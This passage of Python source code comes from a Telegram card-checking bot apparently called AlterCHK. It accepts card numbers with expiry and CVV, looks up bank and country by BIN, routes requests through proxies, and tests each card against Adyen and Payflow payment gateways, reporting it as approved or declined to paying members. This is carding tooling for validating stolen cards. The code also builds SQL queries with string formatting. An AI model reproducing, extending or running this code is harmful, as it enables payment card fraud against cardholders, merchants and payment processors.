                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{respstatus}</b>\nMessage - ↯ <b>{RESPMSG}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
            except TimeoutError or exceptions.RetryAfter as e:
                await asyncio.sleep(e.value)
                return
        elif int(Status.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {Status} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["any"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Adyen [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Adyen [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Adyen [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('any')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This Gateway only accepts American, Visa and Mastercard.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDany import AdyenPaulasChice
        CheckRecive = await AdyenPaulasChice(CcVerify, CheckedP[1])
        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'
        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["pfw"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Poseidon [ Auth ]'
    TwoNameGateway = 'Gateway ↯ Poseidon [ Auth ]'
    ThreeGateway = 'Gateway 🔥 Poseidon [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('pfw')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDpfw import CMDPayflowAuth
        Status = await CMDPayflowAuth(CcVerify, CheckedP[1])
